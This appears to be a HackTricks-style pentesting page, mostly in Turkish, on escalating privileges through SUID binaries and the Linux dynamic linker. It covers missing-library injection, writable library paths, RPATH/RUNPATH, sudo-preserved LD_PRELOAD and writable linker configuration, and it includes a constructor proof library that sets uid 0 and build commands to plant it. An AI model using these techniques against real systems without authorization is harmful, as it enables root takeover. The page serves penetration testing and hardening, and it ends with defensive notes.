# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binary'leri genellikle doğrudan command execution açısından incelenir; ancak custom SUID programları dynamic linker üzerinden de vulnerable olabilir. Ortak tema basittir: privileged bir executable, lower-privileged bir kullanıcının etkileyebileceği bir path veya configuration üzerinden code yükler.

Bu sayfa generic technique pattern'lerine odaklanır: eksik libraries, writable library directories, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.

## Fast Enumeration

Olağandışı SUID file'larını bularak ve bunların dynamically linked olup olmadığını kontrol ederek başlayın:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Standart olmayan konumlara, özel uygulama yollarına, paket yöneticisi tarafından yönetilen dizinlerin dışında bulunan root sahipli binary'lere ve yazılabilir dizinlerden yüklenen dependency'lere odaklanın.

Faydalı yazılabilirlik kontrolleri:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Bazı özel SUID binary'leri mevcut olmayan bir shared object yüklemeye çalışır. Eksik yol attacker tarafından kontrol edilen bir dizinin altındaysa binary, attacker tarafından sağlanan code'u effective user olarak yükleyebilir.

Başarısız library aramalarını bulun:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
İkili dosya `libexample.so` için yazılabilir bir yolda arama yapıyorsa, minimal bir proof library `constructor` kullanabilir. Doğrulama sırasında etki kanıtını zararsız tutun:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Binary'nin yüklemeye çalıştığı tam dosya adıyla derleyin:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
İstismar edilebilir koşul yalnızca eksik kütüphaneden ibaret değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir path'e uyumlu bir shared object yerleştirebilmelidir.

## Yazılabilir Kütüphane Dizini

Bazen tüm bağımlılıklar mevcut olur, ancak bunları çözümlemek için kullanılan dizinlerden biri yazılabilirdir. Bu durum, yüklenen bir kütüphanenin değiştirilmesine veya aynı ada sahip, daha yüksek öncelikli bir kütüphanenin yerleştirilmesine olanak sağlayabilir.

Bağımlılık path'lerini inceleyin:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Dizin yazılabilirse, bir lab ortamında kopya üzerinde güvenli bir yaklaşımla doğrulayın. Çalışan bir host üzerindeki sistem kütüphanelerini değiştirmek, authentication, package management veya boot-critical services işlemlerini bozabilir.

## RPATH ve RUNPATH

`RPATH` ve `RUNPATH`, loader'a kütüphaneler için nerede arama yapacağını bildiren dynamic-section girdileridir. Attacker-writable dizinleri gösterdiklerinde SUID programlarında tehlikelidirler.

Tespit edin:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Riskli çıktı örneği:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` yazılabilirse ve binary `libcustom.so` gerektiriyorsa, saldırgan buraya kötü amaçlı bir `libcustom.so` yerleştirebilir:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` ve `RUNPATH`, tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi açısından pratik soru aynıdır: SUID binary, bir library name için attacker tarafından yazılabilir bir dizinde arama yapıyor mu?

## LD_PRELOAD, LD_LIBRARY_PATH ve SUID

Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarda dynamic loader normalde secure-execution mode'a geçer ve tehlikeli environment variable'ları yok sayar.

Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle düz bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Yaygın istisna, sudo yanlış yapılandırmasıdır. `sudo -l`, `LD_PRELOAD` veya `LD_LIBRARY_PATH` gibi bir değişkenin korunduğunu gösteriyorsa sudo tarafından izin verilen bir komut, saldırgan tarafından kontrol edilen kodu yükleyebilir:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Bu durumları karıştırmayın:

- Normal bir SUID binary'ye karşı `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploit edilebilir.
- Yazılabilir bir path'te eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploit edilebilir.
- Yazılabilir bir directory'ye yönlendiren `RPATH`/`RUNPATH`: gerekli bir library kontrol edilebildiğinde exploit edilebilir.
- `/etc/ld.so.preload` veya linker config yazma erişimi: sistem genelinde etkilidir ve yüksek impact oluşturur.

## Linker Configuration

Dynamic linker ayrıca `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache ve bazı durumlarda `/etc/ld.so.preload` gibi system configuration'ları da okur.

Yüksek değerli kontroller:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlink'ler, aynı SUID inode'unun birden fazla ad altında görünmesini sağlayabilir. Bu, privileged bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path-based incelemeyi bypass etmek için kullanışlıdır.

Birden fazla link'i olan SUID dosyalarını bulun:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Aynı inode'a giden tüm yolları inceleyin:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Abuse, bir hardlink'in izinleri değiştirmesi değildir. Abuse, path confusion'dır: ayrıcalıklı bir inode, savunmacıların veya script'lerin beklemediği bir ad üzerinden erişilebilir olabilir. Daha ayrıntılı inode ve hardlink workflow'u için bkz. [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- SUID binary'lerini mümkün olduğunca minimal, denetlenmiş ve package-managed tutun.
- Yazılabilir veya application-managed dizinlere işaret eden `RPATH`/`RUNPATH` girdilerinden kaçının.
- Library dizinlerini root-owned tutun ve regular user'lar tarafından yazılabilir olmamalarını sağlayın.
- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader variable'larını sudo üzerinden korumayın.
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID dosyalarını monitor edin.
- Hardlinked SUID dosyalarını review edin ve standard system path'lerinin dışındaki custom SUID wrapper'larını investigate edin.
{{#include ../../banners/hacktricks-training.md}}
